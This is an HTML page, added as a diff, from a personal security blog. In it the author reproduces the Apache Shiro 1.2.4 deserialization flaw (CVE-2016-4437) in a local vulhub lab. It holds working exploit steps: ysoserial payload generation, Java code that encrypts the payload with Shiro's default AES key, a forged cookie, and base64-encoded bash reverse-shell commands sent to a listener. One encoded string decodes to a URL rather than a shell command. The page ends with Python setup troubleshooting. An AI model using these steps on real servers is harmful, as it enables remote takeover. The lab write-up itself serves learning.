@@ -1,0 +1,417 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+
+<head>
+    <meta charset="UTF-8">
+<meta name="viewport"
+      content="width=device-width, initial-scale=1.0, maximum-scale=1.0, minimum-scale=1.0">
+<meta http-equiv="X-UA-Compatible" content="ie=edge">
+
+    <meta name="author" content="tea9">
+
+
+    <meta name="subtitle" content="加油">
+
+
+    <meta name="description" content="心中有光の孩子 提示：图片都存到了github仓库需要挂代理才能看到">
+
+
+    <meta name="keywords" content="tea9,tea9的博客,开发,android,安全,android安全,android逆向,移动安全,frida,xposed,ollvm,查查查,茶茶茶,茶茶,茶姐姐,茶姐姐博客,茶茶茶博客,茶茶blog">
+
+
+<title>vulhub Apache Shiro 1.2.4反序列化漏洞（CVE-2016-4437）漏洞复现 | tea9のblog</title>
+
+
+
+    <link rel="icon" href="/image/favicon.ico">
+
+
+
+
+    <!-- stylesheets list from _config.yml -->
+    
+    <link rel="stylesheet" href="/css/style.css">
+    
+
+
+
+    <!-- scripts list from _config.yml -->
+    
+    <script src="/js/script.js"></script>
+    
+    <script src="/js/tocbot.min.js"></script>
+    
+
+
+
+    
+    
+        
+    
+
+
+<meta name="generator" content="Hexo 6.2.0"></head>
+
+<body>
+    <script>
+        // this function is used to check current theme before page loaded.
+        (() => {
+            const currentTheme = window.localStorage && window.localStorage.getItem('theme') || '';
+            const isDark = currentTheme === 'dark';
+            const pagebody = document.getElementsByTagName('body')[0]
+            if (isDark) {
+                pagebody.classList.add('dark-theme');
+                // mobile
+                document.getElementById("mobile-toggle-theme").innerText = "· Dark"
+            } else {
+                pagebody.classList.remove('dark-theme');
+                // mobile
+                document.getElementById("mobile-toggle-theme").innerText = "· Light"
+            }
+        })();
+    </script>
+
+    <div class="wrapper">
+        <header>
+    <nav class="navbar">
+        <div class="container">
+            <div class="navbar-header header-logo"><a href="/">Tea9&#39;s Blog</a></div>
+            <div class="menu navbar-right">
+                
+                    <a class="menu-item" href="/archives">Posts</a>
+                
+                    <a class="menu-item" href="/category">Categories</a>
+                
+                    <a class="menu-item" href="/tag">Tags</a>
+                
+                    <a class="menu-item" href="/about">About</a>
+                
+                <input id="switch_default" type="checkbox" class="switch_default">
+                <label for="switch_default" class="toggleBtn"></label>
+            </div>
+        </div>
+    </nav>
+
+    
+    <nav class="navbar-mobile" id="nav-mobile">
+        <div class="container">
+            <div class="navbar-header">
+                <div>
+                    <a href="/">Tea9&#39;s Blog</a><a id="mobile-toggle-theme">·&nbsp;Light</a>
+                </div>
+                <div class="menu-toggle" onclick="mobileBtn()">&#9776; Menu</div>
+            </div>
+            <div class="menu" id="mobile-menu">
+                
+                    <a class="menu-item" href="/archives">Posts</a>
+                
+                    <a class="menu-item" href="/category">Categories</a>
+                
+                    <a class="menu-item" href="/tag">Tags</a>
+                
+                    <a class="menu-item" href="/about">About</a>
+                
+            </div>
+        </div>
+    </nav>
+
+</header>
+<script>
+    var mobileBtn = function f() {
+        var toggleMenu = document.getElementsByClassName("menu-toggle")[0];
+        var mobileMenu = document.getElementById("mobile-menu");
+        if(toggleMenu.classList.contains("active")){
+           toggleMenu.classList.remove("active")
+            mobileMenu.classList.remove("active")
+        }else{
+            toggleMenu.classList.add("active")
+            mobileMenu.classList.add("active")
+        }
+    }
+</script>
+            <div class="main">
+                <div class="container">
+    
+    
+
+    
+    <article class="post-wrap">
+        <header class="post-header">
+            <h1 class="post-title">vulhub Apache Shiro 1.2.4反序列化漏洞（CVE-2016-4437）漏洞复现</h1>
+            
+                <div class="post-meta">
+                    
+                        Author: <a itemprop="author" rel="author" href="/">tea9</a>
+                    
+
+                    
+                        <span class="post-time">
+                        Date: <a href="#">四月 11, 2022&nbsp;&nbsp;11:10:28</a>
+                        </span>
+                    
+                    
+                        <span class="post-category">
+                    Category:
+                            
+                                <a href="/categories/Security/">Security</a>
+                            
+                        </span>
+                    
+                </div>
+            
+        </header>
+
+        <div class="post-content">
+            <p><strong>漏洞成因：</strong></p>
+<p><img src="https://cdn.nlark.com/yuque/0/2022/png/640657/1648116087699-affcc432-03dd-4f18-98a9-3ce993832542.png" alt="img"></p>
+<p><strong>影响版本：</strong></p>
+<p>影响Shiro&lt;1.2.5,当未设置用于”remember me”特性的AES密钥时，存在反序列化漏洞，可远程命令执行</p>
+<p><strong>环境创建：</strong></p>
+<p>首先进入目录</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cd</span> \vulhub-master\shiro\CVE-2016-4437</span><br><span class="line"><span class="comment">#执行命令</span></span><br><span class="line">docker-compose build</span><br><span class="line"><span class="comment">#因为8080跟burp的端口冲突了然后我修改端口为9090</span></span><br><span class="line">打开docker-compose.yml</span><br><span class="line">修改端口</span><br><span class="line">    - <span class="string">&quot;9090:8080&quot;</span></span><br><span class="line"><span class="comment"># 启动整个环境</span></span><br><span class="line">docker-compose up -d</span><br></pre></td></tr></table></figure>
+
+<p>访问<a target="_blank" rel="noopener" href="http://127.0.0.1:9090/">http://127.0.0.1:9090/</a></p>
+<p><img src="https://cdn.nlark.com/yuque/0/2022/png/640657/1647322115532-ea5b65ef-e450-4edb-abdf-e965a91efcc2.png" alt="img"></p>
+<p>复现需要ysoserial工具：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">git <span class="built_in">clone</span> https://github.com/frohoff/ysoserial.git</span><br><span class="line"><span class="built_in">cd</span> ysoserial</span><br><span class="line">mvn package -D skipTests</span><br></pre></td></tr></table></figure>
+
+<p>生成的工具在target&#x2F;目录下ysoserial-0.0.6-SNAPSHOT-all.jar文件</p>
+<p>测试nc</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">在攻击a上： nc -l 1234</span><br><span class="line">在b上： nc 192.168.231.129 1234</span><br></pre></td></tr></table></figure>
+
+<p>通信截图</p>
+<p>漏洞利用，需要在攻击的机器上监听下端口</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -l -p 1234</span><br></pre></td></tr></table></figure>
+
+<p>反弹shell命令</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bash -i &gt;&amp; /dev/tcp/127.0.0.1/1234 0&gt;&amp;1</span><br></pre></td></tr></table></figure>
+
+<p>把命令编码</p>
+<p>链接失效了<a target="_blank" rel="noopener" href="http://www.jackson-t.ca/runtime-exec-payloads.html">http://www.jackson-t.ca/runtime-exec-payloads.html</a></p>
+<p>大佬发了个替代的</p>
+<p><a target="_blank" rel="noopener" href="https://ares-x.com/tools/runtime-exec/">https://ares-x.com/tools/runtime-exec/</a></p>
+<p><img src="https://cdn.nlark.com/yuque/0/2022/png/640657/1647325054826-014c3847-9675-40c0-9fdb-38046441c2af.png" alt="img"></p>
+<p>然后运行命令（通过 ysoserial中的JRMP监听模块，监听 6666 端口并执行反弹shell命令） 看不懂什么意思，反正先试试看</p>
+<p>注：</p>
+<p>payloads&#x2F;JRMPClient 是结合 exploit&#x2F;JRMPListener 使用的；<br>JRMPListener是ysoserial 工具里的其中一个利用模块，作用是通过反序列化，开启当前主机的一个 JRMP Server ，具体的利用过程是，将反序列化数据 发送到 Server 中，然后Server中进行反序列化操作，并开启指定端口，然后在通过JRMPClient去发送攻击 payload；<br>payloads&#x2F;JRMPClient 生存的 payload 是发送给目标机器的，exploit&#x2F;JRMPListener 是在自己服务器上使用的。</p>
+<p>bash -c {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xMjcuMC4wLjEvMTIzNCAwPiYx}|{base64,-d}|{bash,-i}</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">java -<span class="built_in">cp</span> ysoserial-master-SNAPSHOT.jar ysoserial.exploit.JRMPListener 6666 CommonsCollections4 <span class="string">&#x27;bash -c &#123;echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xMjcuMC4wLjEvMTIzNCAwPiYx&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;&#x27;</span></span><br></pre></td></tr></table></figure>
+
+<p>要在linux中运行 windows运行报错</p>
+<p>监听6666端口</p>
+<p><img src="https://cdn.nlark.com/yuque/0/2022/png/640657/1647325843673-4886c41a-f878-4baa-a9f2-917e8fe435d6.png" alt="img"></p>
+<p>python shiro.py 攻击者IP:攻击者监听的java端口</p>
+<hr>
+<p>上周在忙工作，这周开始复现</p>
+<p><img src="https://cdn.nlark.com/yuque/0/2022/png/640657/1648114024305-a4947b0b-fe23-4329-bf48-a71b743e33e1.png" alt="img"></p>
+<p>重新启动docker</p>
+<p>以下为闲话可以忽略。。。</p>
+<p>复现需要用到一个ysoserial-master-xx.jar的工具，你问我在哪里下我也不知道，找大佬要的，反正很好用就对了，对了，复现漏洞你要了解原理，要了解java反序列化什么cc1链什么的，反正我现在都不会，就先复现漏洞好了，记录下版本号，记录下危害，到实际利用的时候能使用就好了，原理什么的是后面的事情，一上来就学原理脑袋都大了。</p>
+<p>从这开始开始复现</p>
+<p><strong>第一步 生成poc文件</strong></p>
+<p>使用ysoserial生成CommonsBeanutils1的Gadget：&lt;ps 我也还不懂，等我懂了的时候在记笔记，反正之前大佬复现文章中说是叫这个</p>
+<p>命令</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">java -jar ysoserial-master-SNAPSHOT.jar CommonsBeanutils1 <span class="string">&quot;touch /tmp/success&quot;</span> &gt;poc.ser</span><br></pre></td></tr></table></figure>
+
+<p>会生成一个poc.ser的文件 &lt; 命令的大概意思是使用yso这个jar包 利用cc1链 执行一个在tmp目录里创建success文件的命令，最后生成一个poc.ser的文件</p>
+<p><strong>第二步</strong> <strong>使用Shiro内置的默认密钥对Payload进行加密</strong></p>
+<p>需要编写java代码使用默认密钥aes加密算法对文件加密</p>
+<p>执行代码：</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> com.sun.org.apache.xml.internal.security.exceptions.Base64DecodingException;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xml.internal.security.utils.Base64;</span><br><span class="line"><span class="keyword">import</span> org.apache.shiro.codec.CodecSupport;</span><br><span class="line"><span class="keyword">import</span> org.apache.shiro.crypto.AesCipherService;</span><br><span class="line"><span class="keyword">import</span> org.apache.shiro.util.ByteSource;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> java.nio.file.FileSystems;</span><br><span class="line"><span class="keyword">import</span> java.nio.file.Files;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">ShiroTest</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="type">byte</span>[] payloads = <span class="keyword">new</span> <span class="title class_">byte</span>[<span class="number">0</span>];</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="comment">//FileSystems.getDefault().getPath(&quot;C:/&quot;, &quot;access.log&quot;);</span></span><br><span class="line">            <span class="comment">//payloads = Files.readAllBytes(FileSystems.getDefault().getPath(&quot;/path&quot;, &quot;to&quot;, &quot;poc.ser&quot;));</span></span><br><span class="line">            payloads = Files.readAllBytes(FileSystems.getDefault().getPath(<span class="string">&quot;C:\\Users\\tea90\\Documents\\tea\\tools&quot;</span>, <span class="string">&quot;poc.ser&quot;</span>));</span><br><span class="line">            <span class="type">AesCipherService</span> <span class="variable">aes</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">AesCipherService</span>();</span><br><span class="line">            <span class="type">byte</span>[] key = Base64.decode(CodecSupport.toBytes(<span class="string">&quot;kPH+bIxk5D2deZiIxcaaaA==&quot;</span>));</span><br><span class="line"></span><br><span class="line">            <span class="type">ByteSource</span> <span class="variable">ciphertext</span> <span class="operator">=</span> aes.encrypt(payloads, key);</span><br><span class="line">            System.out.printf(ciphertext.toString());</span><br><span class="line">        &#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Base64DecodingException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>执行结果</p>
+<p><img src="https://cdn.nlark.com/yuque/0/2022/png/640657/1648115845892-c8191993-344a-4c34-a182-b37f712a2a91.png" alt="img"></p>
+<p>有个报错，但是也跑出来不知道对不对</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">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</span><br></pre></td></tr></table></figure>
+
+<p>发送生成的cookie看是否创建了文件，创建文件了就代表复现成功了。</p>
+<p>用浏览器打开<a target="_blank" rel="noopener" href="http://127.0.0.1:9090/">http://127.0.0.1:9090</a></p>
+<p>用户名和密码为：admin:vulhub</p>
+<p>用127.0.0.1抓不到包</p>
+<p>用<a href="http://localhost:9090访问">http://localhost:9090访问</a></p>
+<p><img src="https://cdn.nlark.com/yuque/0/2022/png/640657/1648131191228-25322577-3389-4a54-8d73-531131b0a70f.png" alt="img"></p>
+<p>直接替换cookie</p>
+<p><img src="https://cdn.nlark.com/yuque/0/2022/png/640657/1648131280065-a0ff9b99-3665-438a-ba81-6ff11acad134.png" alt="img"></p>
+<p>刷新页面，进入docker的控制台看命令是否执行了</p>
+<p><strong>反弹shell</strong></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bash -i &gt;&amp; /dev/tcp/192.168.0.160/6666 0&gt;&amp;1</span><br></pre></td></tr></table></figure>
+
+<p>命令编码</p>
+<p><a target="_blank" rel="noopener" href="https://ares-x.com/tools/runtime-exec/">https://ares-x.com/tools/runtime-exec/</a></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bash -c &#123;<span class="built_in">echo</span>,aHR0cHM6Ly9hcmVzLXguY29tL3Rvb2xzL3J1bnRpbWUtZXhlYy8=&#125;|&#123;<span class="built_in">base64</span>,-d&#125;|&#123;bash,-i&#125;</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://cdn.nlark.com/yuque/0/2022/png/640657/1648132324308-594f65ae-8c2f-461c-aaa6-01773ed6c3f6.png" alt="img"></p>
+<p>攻击端监听 nc -lvp 6666</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python2 shiro_exploit.py -t 3 -u http://127.0.0.1:9090/doLogin -p <span class="string">&quot;bash -c &#123;echo,aHR0cHM6Ly9hcmVzLXguY29tL3Rvb2xzL3J1 bnRpbWUtZXhlYy8=&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;&quot;</span></span><br></pre></td></tr></table></figure>
+
+<p>执行脚本</p>
+<hr>
+<p>然后我电脑是有python3和python2 然后一直就有个问题pip安装不上东西</p>
+<p>首先出现了个</p>
+<p>大佬推荐了个python虚拟环境conda可以之后试一试</p>
+<p>Fatal error in launcher: Unable to create process using ‘“‘（已解决）</p>
+<p>就重新安装一下python点击modify或者repair就好了</p>
+<p><img src="https://cdn.nlark.com/yuque/0/2022/png/640657/1648171151570-6920a767-3bbf-493c-b07f-6057fbf869b7.png" alt="img"></p>
+<p>然后还出现了一个问题，安装requests的包就一直为空，解决方法是python3和python2共存</p>
+<p>步骤就是 先安装python3 然后设置环境变量，在安装python2设置环境变量（C:\Python27;C:\Python27\Scripts   这两个目录添加到环境变量里），把安装目录的python改成python2和python3，pythonw改成pythonw2和pythonw3</p>
+<p>然后使用的命令为python2和python3</p>
+<p>还有在分别安装pip</p>
+<p>python2 -m pip install –upgrade pip –force-reinstall</p>
+<p>python3 -m pip install –upgrade pip –force-reinstall</p>
+<p><img src="https://cdn.nlark.com/yuque/0/2022/png/640657/1648171271698-40512a33-a0d3-44bb-aa83-4d418c644da7.png" alt="img"></p>
+<p>参考文章：<a target="_blank" rel="noopener" href="https://blog.csdn.net/qj30212/article/details/78565083">https://blog.csdn.net/qj30212/article/details/78565083</a></p>
+<hr>
+<p>搞完上面所有的步骤之后，我发现还是安装不上，太晚了我就睡觉了</p>
+<p><img src="https://cdn.nlark.com/yuque/0/2022/png/640657/1648171601427-107741d6-8ca5-4788-855d-a484c73d4b1f.png" alt="img"></p>
+<p>后来为什么好了，我到公司重新尝试就好了，我也不知道什么原因，因为我各种方式都尝试了，增加超时时间，换源都尝试了昨天就是不好，今天就好了</p>
+<p>现在可以安装requests包了</p>
+<p><img src="https://cdn.nlark.com/yuque/0/2022/png/640657/1648171704071-728c57e8-39eb-472d-afe3-da34461d1e79.png" alt="img"></p>
+<p>还有个依赖包要装</p>
+<p>ImportError: No module named Crypto.Cipher</p>
+<p>pip2 install pycrypto</p>
+<p>然后又报错了</p>
+<p><img src="https://cdn.nlark.com/yuque/0/2022/png/640657/1648172523854-40158f82-1bcd-4de0-bd1b-79ad4b4ea10c.png" alt="img"></p>
+<p><a target="_blank" rel="noopener" href="https://www.lfd.uci.edu/~gohlke/pythonlibs/">https://www.lfd.uci.edu/~gohlke/pythonlibs/</a></p>
+<p>打开网站搜索到pycrypto手动进行安装</p>
+<p><img src="https://cdn.nlark.com/yuque/0/2022/png/640657/1648172566812-a597d7ba-d217-4079-808a-ea4dac2c3dd8.png" alt="img"></p>
+<p>他说不在维护了</p>
+<p><img src="https://cdn.nlark.com/yuque/0/2022/png/640657/1648172710632-10213b7b-71db-4e63-93a9-4bae6bec1089.png" alt="img"></p>
+<p>那我只好重新写个脚本了，首先看下脚本大概的功能然后在进行重写</p>
+<p>本来打算重写了，可无奈看不懂代码，于是我继续搜索，发现了这个</p>
+<p><img src="https://cdn.nlark.com/yuque/0/2022/png/640657/1648173294398-878a5a92-45e5-4480-90c6-4d8fd7af6f64.png" alt="img"></p>
+<p>看来无论如何都要安装conda了</p>
+<p>开搞！</p>
+<p>首先要从<a target="_blank" rel="noopener" href="https://docs.conda.io/en/latest/miniconda.html">https://docs.conda.io/en/latest/miniconda.html</a></p>
+<p>这个网址下载你对应系统的安装包，如果其他系统的，你不会那我建议你搜下教程，因为我也不会</p>
+<p>我只需要下载win64版本的就好了</p>
+<p><img src="https://cdn.nlark.com/yuque/0/2022/png/640657/1648173480969-8dca5fcc-f803-4b51-a24d-da640562d0e8.png" alt="img"></p>
+<p>安装过程就是一路下一步，然后选择加到环境变量，重新打开一个命令行执行conda看是否可以执行</p>
